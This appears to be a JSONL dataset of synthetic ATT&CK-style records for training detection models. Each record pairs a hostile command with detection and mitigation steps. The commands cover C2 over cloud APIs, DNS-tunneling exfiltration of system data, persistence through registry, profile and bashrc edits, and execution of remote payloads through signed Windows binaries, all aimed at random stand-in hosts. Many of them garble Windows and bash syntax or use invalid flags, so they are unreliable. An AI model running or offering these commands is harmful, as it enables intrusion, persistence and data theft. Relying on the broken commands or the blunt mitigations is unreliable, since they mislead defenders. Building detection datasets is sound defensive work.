{"id":378,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using Invoke-WebRequest for C2 via Dropbox API.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://content.dropboxapi.com/2/files/download -Headers @{Authorization='Bearer $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)'} -OutFile C:\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt\"","detection":"Monitor Invoke-WebRequest Dropbox: `wmic process where name='powershell.exe' get commandline | findstr dropboxapi.com`; Network traffic: `tshark -Y 'http.host contains dropboxapi.com'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block Dropbox API: `netsh advfirewall firewall add rule name='Block Dropbox' dir=out action=block remoteip=162.125.0.0/16`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect Invoke-WebRequest C2 via Dropbox API by analyzing HTTP headers, Dropbox API endpoints, and file creation patterns; recommend API blocking."}
{"id":379,"tactic":"Persistence","technique":"T1546.013: PowerShell Profile","threat":"Adding DNS tunneling script to PowerShell profile.","command":"echo \"Resolve-DnsName -Type TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\" >> $PROFILE.CurrentUserAllHosts","detection":"Monitor PowerShell profiles: `Get-Content $PROFILE.CurrentUserAllHosts | findstr Resolve-DnsName`; Event ID 4663.","mitigation":"Restrict profile writes: `icacls $PROFILE.CurrentUserAllHosts /deny Everyone:WX`; Audit profile changes: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1546.013: https://attack.mitre.org/techniques/T1546/013/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect DNS tunneling persistence in PowerShell profiles by analyzing Resolve-DnsName commands, base64-encoded subdomains, and file modifications; suggest profile protections."}
{"id":380,"tactic":"Defense Evasion","technique":"T1218.014: MMC","threat":"Using mmc to execute DNS tunneling MSC file.","command":"mmc http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msc) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor mmc HTTP: `wmic process where name='mmc.exe' get commandline | findstr http`; YARA rule: `rule MmcDnsTunnel { strings: $a = /mmc.*http.*msc/ nocase; condition: $a }`.","mitigation":"Restrict mmc: `icacls %windir%\\System32\\mmc.exe /deny Everyone:RX`; Block MSC downloads: `netsh advfirewall firewall add rule name='Block mmc' dir=out program='%windir%\\System32\\mmc.exe' action=block`.","references":["MITRE ATT&CK T1218.014: https://attack.mitre.org/techniques/T1218/014/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mmc-based DNS tunneling MSC execution by analyzing HTTP downloads, mmc command-line arguments, and DNS query patterns; suggest MSC download restrictions."}
{"id":381,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using nslookup with MX records for DNS tunneling C2.","command":"nslookup -type=MX $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor DNS MX queries: `tshark -Y 'dns.qry.type == 15' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.","mitigation":"Restrict nslookup: `icacls %windir%\\System32\\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect DNS tunneling via nslookup MX queries by analyzing query frequency, base64-encoded subdomains, and MX record patterns; suggest DNS filtering."}
{"id":382,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using PowerShell to exfiltrate disk information via DNS TXT queries.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; $disk = Get-Disk | Out-String; $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($disk)); Resolve-DnsName -Type TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$enc.$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor disk DNS: `wmic process where name='powershell.exe' get commandline | findstr Get-Disk`; DNS TXT spikes: `tshark -Y 'dns.qry.type == 16'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block TXT DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell disk information exfiltration via DNS TXT queries by analyzing base64-encoded subdomains, Get-Disk execution, and DNS traffic patterns; suggest DNS filtering."}
{"id":383,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using curl to communicate with OneDrive for C2.","command":"curl -H \"Authorization: Bearer $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)\" https://graph.microsoft.com/v1.0/me/drive/items/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/content -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt","detection":"Monitor curl OneDrive: `ps aux | grep curl | grep graph.microsoft.com`; Network traffic: `tcpdump -i any host graph.microsoft.com`.","mitigation":"Restrict curl: `chmod 700 /usr/bin/curl`; Block Microsoft Graph: `iptables -A OUTPUT -d graph.microsoft.com -j DROP`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect curl-based C2 via OneDrive by analyzing HTTP headers, Microsoft Graph API endpoints, and file creation patterns; recommend API blocking."}
{"id":384,"tactic":"Persistence","technique":"T1546.005: Trap","threat":"Using trap for DNS tunneling persistence in Linux.","command":"echo 'trap \"dig +short TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) > /dev/null\" SIGHUP' >> ~/.bashrc","detection":"Monitor trap in bashrc: `cat ~/.bashrc | grep trap | grep dig`; Audit file changes: `auditctl -w ~/.bashrc -p wa`.","mitigation":"Restrict bashrc writes: `chmod 600 ~/.bashrc`; Monitor shell configuration changes.","references":["MITRE ATT&CK T1546.005: https://attack.mitre.org/techniques/T1546/005/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect DNS tunneling persistence via trap in bashrc by analyzing dig TXT commands, base64-encoded subdomains, and file modifications; suggest file protections."}
{"id":385,"tactic":"Defense Evasion","technique":"T1218.008: Odbcconf","threat":"Using odbcconf to execute DNS tunneling driver.","command":"odbcconf /S /A {CONFIGSYSDSN \"http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"}","detection":"Monitor odbcconf HTTP: `wmic process where name='odbcconf.exe' get commandline | findstr http`; YARA rule: `rule OdbcconfDnsTunnel { strings: $a = /odbcconf.*http/ nocase; condition: $a }`.","mitigation":"Restrict odbcconf: `icacls %windir%\\System32\\odbcconf.exe /deny Everyone:RX`; Block DLL downloads: `netsh advfirewall firewall add rule name='Block odbcconf' dir=out program='%windir%\\System32\\odbcconf.exe' action=block`.","references":["MITRE ATT&CK T1218.008: https://attack.mitre.org/techniques/T1218/008/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect odbcconf-based DNS tunneling driver execution by analyzing HTTP downloads, odbcconf command-line arguments, and DNS query patterns; suggest DLL download restrictions."}
{"id":386,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using dig with SOA records for DNS tunneling C2.","command":"dig +short SOA $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor dig SOA queries: `tcpdump -i any port 53 | grep SOA`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect dig-based DNS tunneling with SOA records by analyzing query patterns, base64-encoded subdomains, and SOA record usage; suggest DNS inspection."}
{"id":387,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using PowerShell to exfiltrate service information via DNS AAAA queries.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; $svc = Get-Service | Out-String; $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($svc)); Resolve-DnsName -Type AAAA $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$enc.$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor service DNS: `wmic process where name='powershell.exe' get commandline | findstr Get-Service`; DNS AAAA spikes: `tshark -Y 'dns.qry.type == 28'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block AAAA DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell service information exfiltration via DNS AAAA queries by analyzing base64-encoded subdomains, Get-Service execution, and DNS traffic patterns; suggest DNS filtering."}
{"id":388,"tactic":"Command and Control","technique":"T1572: Protocol Tunneling","threat":"Using ping to tunnel C2 commands via ICMP with randomized intervals.","command":"ping -n $(shuf -i 5-20 -n 1) -l 1000 $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com -p $(echo c2cmd | base64 -w0)","detection":"Monitor ICMP ping: `wmic process where name='ping.exe' get commandline | findstr -p`; Anomalous ICMP traffic: `tshark -Y 'icmp' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict ping: `icacls %windir%\\System32\\ping.exe /deny Everyone:RX`; Block ICMP: `netsh advfirewall firewall add rule name='Block ICMP' dir=out action=block protocol=ICMPv4`.","references":["MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect ICMP-based C2 tunneling via ping by analyzing packet size, base64-encoded patterns, randomized intervals, and ICMP traffic anomalies; suggest ICMP filtering."}
{"id":389,"tactic":"Persistence","technique":"T1546.012: Image File Execution Options Injection","threat":"Using IFEO to inject DNS tunneling debugger.","command":"reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\nslookup.exe\" /v Debugger /t REG_SZ /d \"C:\\$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor IFEO: `reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" | findstr nslookup`; Event ID 4657.","mitigation":"Restrict IFEO writes: `regini -h deny \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\"`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.","references":["MITRE ATT&CK T1546.012: https://attack.mitre.org/techniques/T1546/012/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect IFEO-based DNS tunneling debugger injections by analyzing nslookup-related registry changes, debugger paths, and DNS query patterns; suggest registry protections."}
{"id":390,"tactic":"Defense Evasion","technique":"T1218.004: InstallUtil","threat":"Using InstallUtil to execute DNS tunneling .NET binary.","command":"InstallUtil /logfile= /LogToConsole=false /U http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor InstallUtil HTTP: `wmic process where name='InstallUtil.exe' get commandline | findstr http`; YARA rule: `rule InstallUtilDnsTunnel { strings: $a = /InstallUtil.*http/ nocase; condition: $a }`.","mitigation":"Restrict InstallUtil: `icacls %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /deny Everyone:RX`; Block .NET downloads: `netsh advfirewall firewall add rule name='Block InstallUtil' dir=out program='%windir%\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe' action=block`.","references":["MITRE ATT&CK T1218.004: https://attack.mitre.org/techniques/T1218/004/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect InstallUtil-based DNS tunneling .NET execution by analyzing HTTP downloads, InstallUtil command-line arguments, and DNS query patterns; suggest .NET download restrictions."}
{"id":391,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using nslookup with NS records for DNS tunneling C2.","command":"nslookup -type=NS $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor DNS NS queries: `tshark -Y 'dns.qry.type == 2' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.","mitigation":"Restrict nslookup: `icacls %windir%\\System32\\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect DNS tunneling via nslookup NS queries by analyzing query frequency, base64-encoded subdomains, and NS record patterns; suggest DNS filtering."}
{"id":392,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using PowerShell to exfiltrate network adapter information via DNS CNAME queries.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; $net = Get-NetAdapter | Out-String; $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($net)); Resolve-DnsName -Type CNAME $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$enc.$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor network DNS: `wmic process where name='powershell.exe' get commandline | findstr Get-NetAdapter`; DNS CNAME spikes: `tshark -Y 'dns.qry.type == 5'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block CNAME DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell network adapter exfiltration via DNS CNAME queries by analyzing base64-encoded subdomains, Get-NetAdapter execution, and DNS traffic patterns; suggest DNS filtering."}
{"id":393,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using Invoke-WebRequest for C2 via GitHub API.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://api.github.com/repos/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/contents/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt -Headers @{Authorization='token $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 40)'} -OutFile C:\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt\"","detection":"Monitor Invoke-WebRequest GitHub: `wmic process where name='powershell.exe' get commandline | findstr api.github.com`; Network traffic: `tshark -Y 'http.host contains api.github.com'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block GitHub API: `netsh advfirewall firewall add rule name='Block GitHub' dir=out action=block remoteip=140.82.112.0/20`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect Invoke-WebRequest C2 via GitHub API by analyzing HTTP headers, GitHub API endpoints, and file creation patterns; recommend API blocking."}
{"id":394,"tactic":"Persistence","technique":"T1546.014: Emond","threat":"Using emond for DNS tunneling persistence on macOS.","command":"echo 'command=/bin/bash -c \"dig +short TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) > /dev/null\"' > /etc/emond.d/rules/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).plist && launchctl load /etc/emond.d/rules/*","detection":"Monitor emond rules: `ls /etc/emond.d/rules | grep .plist`; Audit file changes: `auditctl -w /etc/emond.d -p wa`.","mitigation":"Restrict emond rules: `chmod 700 /etc/emond.d`; Disable emond: `launchctl unload /System/Library/LaunchDaemons/com.apple.emond.plist`.","references":["MITRE ATT&CK T1546.014: https://attack.mitre.org/techniques/T1546/014/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect DNS tunneling persistence via emond by analyzing dig TXT commands, base64-encoded subdomains, and emond rule modifications; suggest access controls."}
{"id":395,"tactic":"Defense Evasion","technique":"T1218.012: Verclsid","threat":"Using verclsid to execute DNS tunneling COM object.","command":"verclsid /S /C {$(uuidgen)} /I http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor verclsid HTTP: `wmic process where name='verclsid.exe' get commandline | findstr http`; YARA rule: `rule VerclsidDnsTunnel { strings: $a = /verclsid.*http/ nocase; condition: $a }`.","mitigation":"Restrict verclsid: `icacls %windir%\\System32\\verclsid.exe /deny Everyone:RX`; Block COM downloads: `netsh advfirewall firewall add rule name='Block verclsid' dir=out program='%windir%\\System32\\verclsid.exe' action=block`.","references":["MITRE ATT&CK T1218.012: https://attack.mitre.org/techniques/T1218/012/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect verclsid-based DNS tunneling COM execution by analyzing HTTP downloads, verclsid command-line arguments, and DNS query patterns; suggest COM download restrictions."}
{"id":396,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using PowerShell to perform DNS tunneling with ANY records.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Resolve-DnsName -Type ANY $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor ANY queries: `tshark -Y 'dns.qry.type == 255' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; PowerShell DNS: `wmic process where name='powershell.exe' get commandline | findstr Resolve-DnsName`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block ANY DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect PowerShell DNS tunneling with ANY records by analyzing query patterns, base64-encoded subdomains, and ANY record usage; suggest DNS filtering."}
{"id":397,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using dig to exfiltrate system information via DNS PTR queries.","command":"dig +short PTR $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(uname -a | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor dig PTR queries: `tcpdump -i any port 53 | grep PTR`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect dig-based DNS exfiltration of system information via PTR queries by analyzing base64-encoded subdomains and DNS traffic anomalies; recommend DNS inspection."}
{"id":398,"tactic":"Command and Control","technique":"T1572: Protocol Tunneling","threat":"Using traceroute to tunnel C2 commands via ICMP.","command":"traceroute -I $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com -q 1 -w 1 -m 10 -p $(echo c2cmd | base64 -w0)","detection":"Monitor traceroute ICMP: `wmic process where name='tracert.exe' get commandline | findstr -I`; Anomalous ICMP traffic: `tshark -Y 'icmp' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict traceroute: `icacls %windir%\\System32\\tracert.exe /deny Everyone:RX`; Block ICMP: `netsh advfirewall firewall add rule name='Block ICMP' dir=out action=block protocol=ICMPv4`.","references":["MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect ICMP-based C2 tunneling via traceroute by analyzing packet patterns, base64-encoded data, and ICMP traffic anomalies; suggest ICMP filtering."}
{"id":399,"tactic":"Persistence","technique":"T1547.004: Winlogon","threat":"Modifying Winlogon registry for DNS tunneling persistence.","command":"reg add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Userinit /t REG_SZ /d \"C:\\Windows\\System32\\userinit.exe,nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)\" /f","detection":"Monitor Winlogon registry: `reg query HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon | findstr nslookup`; Event ID 4657.","mitigation":"Restrict Winlogon writes: `regini -h deny HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.","references":["MITRE ATT&CK T1547.004: https://attack.mitre.org/techniques/T1547/004/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect Winlogon registry modifications for DNS tunneling by analyzing nslookup TXT commands, base64-encoded subdomains, and registry changes; suggest registry protections."}
{"id":400,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using wevtutil to encode event log data in DNS TXT queries for C2.","command":"wevtutil qe System /q:\"*[System[(EventID=4688)]]\" /f:text | findstr nslookup | for /f \"tokens=*\" %i in ('more') do nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo %i | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor wevtutil DNS: `wmic process where name='wevtutil.exe' get commandline | findstr nslookup`; DNS TXT spikes: `tshark -Y 'dns.qry.type == 16'`.","mitigation":"Restrict wevtutil: `icacls %windir%\\System32\\wevtutil.exe /deny Everyone:RX`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block TXT DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect wevtutil-based DNS tunneling by analyzing event log queries, base64-encoded TXT subdomains, and DNS traffic patterns; suggest DNS filtering."}
{"id":401,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using dig to exfiltrate kernel information via DNS SRV queries.","command":"dig +short SRV _$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)._tcp.$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(uname -r | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor dig SRV queries: `tcpdump -i any port 53 | grep SRV`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect dig-based DNS exfiltration of kernel information via SRV queries by analyzing base64-encoded subdomains and DNS traffic anomalies; recommend DNS inspection."}
{"id":402,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using curl to communicate with GitLab API for C2.","command":"curl -H \"Authorization: Bearer $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)\" https://gitlab.com/api/v4/projects/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/repository/files/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt/raw -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt","detection":"Monitor curl GitLab: `ps aux | grep curl | grep gitlab.com`; Network traffic: `tcpdump -i any host gitlab.com`.","mitigation":"Restrict curl: `chmod 700 /usr/bin/curl`; Block GitLab API: `iptables -A OUTPUT -d gitlab.com -j DROP`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect curl-based C2 via GitLab API by analyzing HTTP headers, GitLab API endpoints, and file creation patterns; recommend API blocking."}
{"id":403,"tactic":"Persistence","technique":"T1546.015: Component Object Model Hijacking","threat":"Hijacking COM object for DNS tunneling persistence.","command":"reg add HKLM\\Software\\Classes\\CLSID\\{$(uuidgen)} /v InprocServer32 /t REG_SZ /d \"C:\\$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\" /f","detection":"Monitor COM registry: `reg query HKLM\\Software\\Classes\\CLSID | findstr dnstunnel`; Event ID 4657.","mitigation":"Restrict COM writes: `regini -h deny HKLM\\Software\\Classes\\CLSID`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.","references":["MITRE ATT&CK T1546.015: https://attack.mitre.org/techniques/T1546/015/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect COM hijacking for DNS tunneling persistence by analyzing CLSID registry changes, DLL paths, and DNS query patterns; suggest registry protections."}
{"id":404,"tactic":"Defense Evasion","technique":"T1218.009: Regsvcs/Regasm","threat":"Using regsvcs to execute DNS tunneling .NET assembly.","command":"regsvcs /U http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor regsvcs HTTP: `wmic process where name='regsvcs.exe' get commandline | findstr http`; YARA rule: `rule RegsvcsDnsTunnel { strings: $a = /regsvcs.*http/ nocase; condition: $a }`.","mitigation":"Restrict regsvcs: `icacls %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /deny Everyone:RX`; Block .NET downloads: `netsh advfirewall firewall add rule name='Block regsvcs' dir=out program='%windir%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe' action=block`.","references":["MITRE ATT&CK T1218.009: https://attack.mitre.org/techniques/T1218/009/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect regsvcs-based DNS tunneling .NET execution by analyzing HTTP downloads, regsvcs command-line arguments, and DNS query patterns; suggest .NET download restrictions."}
